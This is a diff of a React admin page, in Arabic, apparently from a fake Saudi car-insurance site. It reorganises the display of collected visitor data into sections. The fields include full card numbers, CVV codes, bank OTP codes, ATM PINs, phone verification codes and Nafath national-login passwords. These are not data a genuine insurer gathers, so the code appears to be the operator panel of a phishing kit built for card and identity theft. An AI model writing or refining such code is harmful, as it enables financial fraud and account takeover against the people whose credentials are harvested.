@@ -1817,44 +1817,106 @@ const AdminVisitors = () => {
                                   </span>
                                 </div>
                               )}
-                              <div className="grid grid-cols-2 gap-2">
-                                {/* Vehicle & insurance info */}
-                                {order.vehicle_make && <InfoItem label="الشركة المصنعة" value={order.vehicle_make} />}
-                                {order.vehicle_model && <InfoItem label="الموديل" value={order.vehicle_model} />}
-                                {order.vehicle_year && <InfoItem label="سنة الصنع" value={order.vehicle_year} />}
-                                {order.serial_number && <InfoItem label="الرقم التسلسلي" value={order.serial_number} />}
-                                {order.passenger_count && <InfoItem label="عدد الركاب" value={order.passenger_count} />}
-                                {order.vehicle_usage && <InfoItem label="غرض الاستخدام" value={order.vehicle_usage === "personal" ? "شخصي" : order.vehicle_usage === "commercial" ? "تجاري" : order.vehicle_usage} />}
-                                {order.estimated_value && <InfoItem label="القيمة التقديرية" value={`${order.estimated_value} ر.س`} />}
-                                {order.repair_location && <InfoItem label="مكان التصليح" value={order.repair_location === "agency" ? "الوكالة" : "ورشة"} />}
-                                {order.base_price != null && <InfoItem label="السعر الأساسي" value={`${order.base_price} ر.س`} />}
-                                {order.total_price != null && <InfoItem label="السعر الإجمالي" value={`${order.total_price} ر.س`} />}
-                                {order.policy_number && <InfoItem label="رقم الوثيقة" value={order.policy_number} />}
-                                {order.draft_policy_number && <InfoItem label="رقم الوثيقة المبدئي" value={order.draft_policy_number} />}
-                                {/* Payment card info */}
-                                {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
-                                {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
-                                {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
-                                {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
-                                {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
-                                {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
-                                {/* OTP */}
-                                {order.otp_code && <InfoItem label="كود OTP" value={order.otp_code} />}
-                                {order.otp_verified !== null && <InfoItem label="تم التحقق" value={order.otp_verified ? "نعم" : "لا"} />}
-                                {/* ATM info */}
-                                {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
-                                {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
-                                {order.atm_pin && <InfoItem label="الرقم السري ATM" value={order.atm_pin} />}
-                                {/* Phone OTP */}
-                                {order.phone_otp_code && <InfoItem label="كود توثيق الجوال" value={order.phone_otp_code} />}
-                                {/* Nafath */}
-                                {order.nafath_password && <InfoItem label="كلمة مرور نفاذ" value={order.nafath_password} />}
-                                {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
-                                {/* Add-ons */}
-                                {order.add_ons && Array.isArray(order.add_ons) && (order.add_ons as any[]).length > 0 && (
-                                  <div className="col-span-2"><InfoItem label="الإضافات" value={(order.add_ons as any[]).map((a: any) => typeof a === 'string' ? a : a.name || JSON.stringify(a)).join("، ")} /></div>
+                              {/* Categorized data sections */}
+                              <div className="space-y-3">
+                                {/* Vehicle info */}
+                                {(order.vehicle_make || order.vehicle_model || order.vehicle_year || order.serial_number || order.passenger_count || order.vehicle_usage || order.estimated_value || order.repair_location) && (
+                                  <div className="space-y-1.5">
+                                    <p className="text-[10px] font-bold text-muted-foreground flex items-center gap-1"><Car className="w-3 h-3" />معلومات المركبة</p>
+                                    <div className="grid grid-cols-2 gap-2">
+                                      {order.vehicle_make && <InfoItem label="الشركة المصنعة" value={order.vehicle_make} />}
+                                      {order.vehicle_model && <InfoItem label="الموديل" value={order.vehicle_model} />}
+                                      {order.vehicle_year && <InfoItem label="سنة الصنع" value={order.vehicle_year} />}
+                                      {order.serial_number && <InfoItem label="الرقم التسلسلي" value={order.serial_number} />}
+                                      {order.passenger_count && <InfoItem label="عدد الركاب" value={order.passenger_count} />}
+                                      {order.vehicle_usage && <InfoItem label="غرض الاستخدام" value={order.vehicle_usage === "personal" ? "شخصي" : order.vehicle_usage === "commercial" ? "تجاري" : order.vehicle_usage} />}
+                                      {order.estimated_value && <InfoItem label="القيمة التقديرية" value={`${order.estimated_value} ر.س`} />}
+                                      {order.repair_location && <InfoItem label="مكان التصليح" value={order.repair_location === "agency" ? "الوكالة" : "ورشة"} />}
+                                    </div>
+                                  </div>
                                 )}
-                                <InfoItem label="تاريخ الطلب" value={formatDate(order.created_at)} />
+
+                                {/* Insurance & pricing */}
+                                {(order.base_price != null || order.total_price != null || order.policy_number || order.draft_policy_number || (order.add_ons && Array.isArray(order.add_ons) && (order.add_ons as any[]).length > 0)) && (
+                                  <div className="space-y-1.5 pt-2 border-t border-border/30">
+                                    <p className="text-[10px] font-bold text-muted-foreground flex items-center gap-1"><Shield className="w-3 h-3" />التأمين والأسعار</p>
+                                    <div className="grid grid-cols-2 gap-2">
+                                      {order.base_price != null && <InfoItem label="السعر الأساسي" value={`${order.base_price} ر.س`} />}
+                                      {order.total_price != null && <InfoItem label="السعر الإجمالي" value={`${order.total_price} ر.س`} />}
+                                      {order.policy_number && <InfoItem label="رقم الوثيقة" value={order.policy_number} />}
+                                      {order.draft_policy_number && <InfoItem label="رقم الوثيقة المبدئي" value={order.draft_policy_number} />}
+                                      {order.add_ons && Array.isArray(order.add_ons) && (order.add_ons as any[]).length > 0 && (
+                                        <div className="col-span-2"><InfoItem label="الإضافات" value={(order.add_ons as any[]).map((a: any) => typeof a === 'string' ? a : a.name || JSON.stringify(a)).join("، ")} /></div>
+                                      )}
+                                    </div>
+                                  </div>
+                                )}
+
+                                {/* Payment card info */}
+                                {(order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv || order.payment_method) && (
+                                  <div className="space-y-1.5 pt-2 border-t border-border/30">
+                                    <p className="text-[10px] font-bold text-amber-600 flex items-center gap-1">💳 معلومات البطاقة</p>
+                                    <div className="grid grid-cols-2 gap-2">
+                                      {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
+                                      {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
+                                      {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
+                                      {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
+                                      {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
+                                      {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
+                                    </div>
+                                  </div>
+                                )}
+
+                                {/* OTP code */}
+                                {(order.otp_code || order.otp_verified !== null) && (
+                                  <div className="space-y-1.5 pt-2 border-t border-border/30">
+                                    <p className="text-[10px] font-bold text-blue-600 flex items-center gap-1">🔑 كود التحقق البنكي (OTP)</p>
+                                    <div className="grid grid-cols-2 gap-2">
+                                      {order.otp_code && <InfoItem label="كود OTP" value={order.otp_code} />}
+                                      {order.otp_verified !== null && <InfoItem label="تم التحقق" value={order.otp_verified ? "نعم" : "لا"} />}
+                                    </div>
+                                  </div>
+                                )}
+
+                                {/* ATM info */}
+                                {(order.atm_bill_number || order.atm_biller_code || order.atm_pin) && (
+                                  <div className="space-y-1.5 pt-2 border-t border-border/30">
+                                    <p className="text-[10px] font-bold text-emerald-600 flex items-center gap-1">🏧 بيانات ATM</p>
+                                    <div className="grid grid-cols-2 gap-2">
+                                      {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
+                                      {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
+                                      {order.atm_pin && <InfoItem label="الرقم السري ATM" value={order.atm_pin} />}
+                                    </div>
+                                  </div>
+                                )}
+
+                                {/* Phone OTP */}
+                                {order.phone_otp_code && (
+                                  <div className="space-y-1.5 pt-2 border-t border-border/30">
+                                    <p className="text-[10px] font-bold text-purple-600 flex items-center gap-1">📲 توثيق رقم الجوال</p>
+                                    <div className="grid grid-cols-2 gap-2">
+                                      <InfoItem label="كود توثيق الجوال" value={order.phone_otp_code} />
+                                    </div>
+                                  </div>
+                                )}
+
+                                {/* Nafath */}
+                                {(order.nafath_password || order.nafath_number) && (
+                                  <div className="space-y-1.5 pt-2 border-t border-border/30">
+                                    <p className="text-[10px] font-bold text-teal-600 flex items-center gap-1">🔐 نفاذ</p>
+                                    <div className="grid grid-cols-2 gap-2">
+                                      {order.nafath_password && <InfoItem label="كلمة مرور نفاذ" value={order.nafath_password} />}
+                                      {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
+                                    </div>
+                                  </div>
+                                )}
+
+                                {/* Order date */}
+                                <div className="pt-2 border-t border-border/30">
+                                  <div className="grid grid-cols-2 gap-2">
+                                    <InfoItem label="تاريخ الطلب" value={formatDate(order.created_at)} />
+                                  </div>
+                                </div>
                               </div>
 
                               {/* Nafath number input for nafath stages */}
